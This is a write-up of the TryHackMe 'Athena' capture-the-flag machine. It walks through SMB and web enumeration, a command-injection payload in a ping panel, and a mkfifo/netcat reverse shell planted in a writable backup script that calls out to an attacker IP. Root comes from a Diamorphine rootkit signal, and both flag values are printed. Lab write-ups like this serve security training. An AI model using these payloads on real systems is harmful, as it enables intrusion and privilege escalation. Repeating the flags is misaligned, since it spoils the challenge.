````md
# TryHackMe - Athena Writeup

> Difficulty: Medium  
> Platform: TryHackMe  
> Machine: Athena  
> Target IP: 10.48.146.180

---

# Objective

Gain initial access to the target machine, escalate privileges, and capture both user and root flags.

---

# Initial Enumeration

## Nmap Full Port Scan

```bash
nmap -p- 10.48.146.180
```

### Results

```text
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

The target exposes:

- SSH (22)
- HTTP (80)
- SMB (139,445)

---

## Service Detection Scan

```bash
nmap -sC -sV 10.48.146.180
```

### Results

```text
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5
80/tcp  open  http        Apache httpd 2.4.41
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  microsoft-ds Samba smbd 4
```

Additional findings:

```text
HTTP Title:
Athena - Gods of olympus

NetBIOS Name:
ROUTERPANEL
```

---

# SMB Enumeration

Since SMB was exposed, enumeration was performed.

```bash
enum4linux 10.48.146.180
```

### Interesting Finding

```text
Server allows sessions using username '' password ''
```

Anonymous SMB access is enabled.

---

## User Enumeration

```text
S-1-22-1-1000 Unix User\ubuntu
S-1-22-1-1001 Unix User\athena
```

Discovered local users:

- ubuntu
- athena

---

# Web Enumeration

## Gobuster Directory Enumeration

```bash
gobuster dir \
-u http://10.48.146.180/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt
```

### Findings

```text
/index.html
/style.css
```

No significant directories discovered.

---

## Additional Directory Enumeration

```bash
gobuster dir \
-u http://10.48.146.180/ \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

### Findings

```text
/server-status (403)
```

Nothing useful was discovered.

Since web enumeration did not reveal much, focus shifted back to SMB.

---

# SMB Share Access

Connecting anonymously to the SMB share:

```bash
smbclient -N //10.48.146.180/public
```

### Directory Listing

```text
msg_for_administrator.txt
```

Reading the file:

```text
Dear Administrator,

I would like to inform you that a new Ping system is being developed and I left the corresponding application in a specific path, which can be accessed through the following address: /myrouterpanel

Yours sincerely,

Athena
Intern
```

A hidden web application endpoint was discovered:

```text
/myrouterpanel
```

---

# Command Injection Discovery

Navigating to:

```text
http://10.48.146.180/myrouterpanel
```

A ping utility was present.

Research into Bash Command Substitution revealed:

```bash
$(command)
```

which allows execution of commands inside another command.

References used during testing:

```text
https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html

https://www.grobinson.me/reverse-shells-even-without-nc-on-linux/
```

---

# Reverse Shell

A netcat listener was prepared.

```bash
nc -lp 4445 -e /bin/bash
```

Payload submitted through Burp Suite:

```text
127.0.0.1 -c1$(nc -lp 4445 -e /bin/bash)
```

Request:

```http
POST /myrouterpanel/ping.php HTTP/1.1

ip=127.0.0.1+-c1$(nc+-lp+4445+-e+/bin/bash)&submit=
```

---

## Obtaining Shell

Connection established:

```bash
nc 10.48.146.180 4445
```

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data)
```

Current user:

```text
www-data
```

---

# Shell Stabilization

Python was available:

```bash
which python3
```

```text
/usr/bin/python3
```

Spawning a TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background shell:

```bash
CTRL+Z
```

```bash
stty raw -echo
fg
```

```bash
export TERM=xterm
```

Fully interactive shell obtained.

---

# Privilege Escalation - User Athena

While enumerating the filesystem, an interesting directory was found.

```bash
cd /usr/share/backup
```

Files:

```text
backup.sh
```

Contents:

```bash
#!/bin/bash

backup_dir_zip=~/backup

mkdir -p "$backup_dir_zip"

cp -r /home/athena/notes/* "$backup_dir_zip"

zip -r "$backup_dir_zip/notes_backup.zip" "$backup_dir_zip"

rm /home/athena/backup/*.txt
rm /home/athena/backup/*.sh

echo "Backup completed..."
```

Permissions:

```text
-rwxr-xr-x 1 www-data athena backup.sh
```

The script was writable.

---

## Modifying backup.sh

Replaced contents with:

```bash
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.138.6 5555 >/tmp/f
```

Listener:

```bash
nc -lvnp 5555
```

Reverse shell received.

---

## Access as Athena

```text
athena@routerpanel
```

Verifying:

```bash
id
```

Access confirmed as:

```text
uid=1001(athena)
gid=1001(athena)
```

---

# User Flag

```bash
cat /home/athena/user.txt
```

```text
857c4a4fbac638afb6c7ee45eb3e1a28
```

---

# Privilege Escalation - Root

Checking sudo permissions:

```bash
sudo -l
```

Output:

```text
(root) NOPASSWD:
/usr/sbin/insmod /mnt/.../secret/venom.ko
```

---

# Rootkit Analysis

The file:

```text
venom.ko
```

was transferred locally and inspected in Ghidra.

Research indicated that the module resembled:

```text
Diamorphine LKM Rootkit
```

Reference:

```text
https://github.com/m0nad/Diamorphine
```

---

## Diamorphine Behavior

Diamorphine modifies kernel structures and hooks the kill syscall.

Interesting behavior discovered:

```text
Signal 0x39 (57)
→ give_root()

Signal 0x3f (63)
→ hide/unhide module
```

---

# Loading The Module

```bash
sudo /usr/sbin/insmod /mnt/.../secret/venom.ko
```

The module remained hidden from:

```bash
lsmod
```

which aligns with Diamorphine behavior.

---

## Signal Testing

Start a process:

```bash
sleep 10 &
```

Attempt module interaction:

```bash
kill -64 PID
```

No privilege escalation occurred.

---

# Root Access

Start another process:

```bash
sleep 10 &
```

Send signal 57:

```bash
kill -57 PID
```

Checking privileges:

```bash
id
```

Output:

```text
uid=0(root)
gid=0(root)
groups=0(root),1001(athena)
```

Root privileges obtained.

---

# Root Flag

```bash
sudo su
```

```bash
cat /root/root.txt
```

```text
aecd4a3497cd2ec4bc71a2315030bd48
```

---

# Flags

## User Flag

```text
857c4a4fbac638afb6c7ee45eb3e1a28
```

## Root Flag

```text
aecd4a3497cd2ec4bc71a2315030bd48
```

---

# Attack Path Summary

```text
SMB Anonymous Access
        ↓
msg_for_administrator.txt
        ↓
/myrouterpanel
        ↓
Command Injection
        ↓
www-data Shell
        ↓
Writable backup.sh
        ↓
athena Shell
        ↓
sudo insmod venom.ko
        ↓
Diamorphine Rootkit Analysis
        ↓
kill -57
        ↓
Root
```

---

# Conclusion

Athena is a Linux-based medium difficulty machine that combines multiple attack vectors including SMB enumeration, anonymous share access, command injection, writable scripts, and kernel rootkit abuse.

The initial foothold was achieved through command injection in the router panel ping functionality. A writable backup script allowed lateral movement from `www-data` to `athena`. Finally, analysis of the `venom.ko` kernel module revealed Diamorphine rootkit functionality, allowing privilege escalation to root through a specially crafted signal.

Machine successfully compromised and both flags captured.
````
